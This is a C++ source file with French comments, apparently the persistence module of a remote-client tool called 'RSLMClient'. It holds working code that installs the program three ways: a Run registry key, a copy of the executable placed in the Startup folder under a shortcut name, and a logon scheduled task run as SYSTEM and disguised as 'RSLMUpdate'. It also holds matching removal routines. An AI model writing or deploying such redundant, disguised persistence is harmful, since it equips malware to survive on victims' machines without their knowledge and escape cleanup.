#include "PersistenceHandler.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")

namespace rslm {
    namespace client {
        namespace messages {

            // Méthode 1 : Clé Run (registre)
            bool PersistenceHandler::AddToRunRegistry(const std::string& exePath) {
                HKEY hKey;
                LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_SET_VALUE, &hKey);

                if (result != ERROR_SUCCESS) {
                    std::cerr << "[Persistence] Failed to open Run registry key" << std::endl;
                    return false;
                }

                result = RegSetValueExA(hKey, "RSLMClient", 0, REG_SZ,
                    (const BYTE*)exePath.c_str(), exePath.size() + 1);

                RegCloseKey(hKey);

                if (result == ERROR_SUCCESS) {
                    std::cout << "[Persistence] Added to Run registry" << std::endl;
                    return true;
                }
                return false;
            }

            // Méthode 2 : Dossier Startup
            bool PersistenceHandler::AddToStartupFolder(const std::string& exePath) {
                char startupPath[MAX_PATH];
                if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
                    std::string shortcutPath = std::string(startupPath) + "\\RSLMClient.lnk";

                    // Copier le fichier (au lieu de créer un raccourci)
                    if (CopyFileA(exePath.c_str(), shortcutPath.c_str(), FALSE)) {
                        std::cout << "[Persistence] Added to Startup folder" << std::endl;
                        return true;
                    }
                }
                return false;
            }

            // Méthode 3 : Tâche planifiée (schtasks)
            bool PersistenceHandler::AddScheduledTask(const std::string& exePath) {
                std::string command = "schtasks /create /tn \"RSLMUpdate\" /tr \"" + exePath + "\" /sc onlogon /ru \"SYSTEM\" /f";
                int result = system(command.c_str());

                if (result == 0) {
                    std::cout << "[Persistence] Added scheduled task" << std::endl;
                    return true;
                }
                return false;
            }

            // Supprimer la clé Run
            bool PersistenceHandler::RemoveFromRunRegistry() {
                HKEY hKey;
                LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_SET_VALUE, &hKey);

                if (result != ERROR_SUCCESS) return false;

                result = RegDeleteValueA(hKey, "RSLMClient");
                RegCloseKey(hKey);

                return (result == ERROR_SUCCESS);
            }

            // Supprimer la tâche planifiée
            bool PersistenceHandler::RemoveScheduledTask() {
                std::string command = "schtasks /delete /tn \"RSLMUpdate\" /f";
                return (system(command.c_str()) == 0);
            }

            // Vérifier si la persistance est active
            bool PersistenceHandler::IsPersistenceActive() {
                HKEY hKey;
                char value[1024];
                DWORD size = sizeof(value);

                LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_QUERY_VALUE, &hKey);

                if (result != ERROR_SUCCESS) return false;

                result = RegQueryValueExA(hKey, "RSLMClient", nullptr, nullptr, (BYTE*)value, &size);
                RegCloseKey(hKey);

                return (result == ERROR_SUCCESS);
            }

            // Installer toutes les méthodes
            void PersistenceHandler::InstallAll(const std::string& exePath) {
                std::cout << "[Persistence] Installing persistence..." << std::endl;

                std::string currentPath = exePath;
                if (currentPath.empty()) {
                    char buffer[MAX_PATH];
                    GetModuleFileNameA(NULL, buffer, MAX_PATH);
                    currentPath = std::string(buffer);
                }

                AddToRunRegistry(currentPath);
                AddToStartupFolder(currentPath);
                AddScheduledTask(currentPath);

                std::cout << "[Persistence] Installation complete" << std::endl;
            }

            // Supprimer toutes les méthodes
            void PersistenceHandler::RemoveAll() {
                std::cout << "[Persistence] Removing persistence..." << std::endl;
                RemoveFromRunRegistry();
                RemoveScheduledTask();
                std::cout << "[Persistence] Removal complete" << std::endl;
            }

        } // namespace messages
    } // namespace client
} // namespace rslm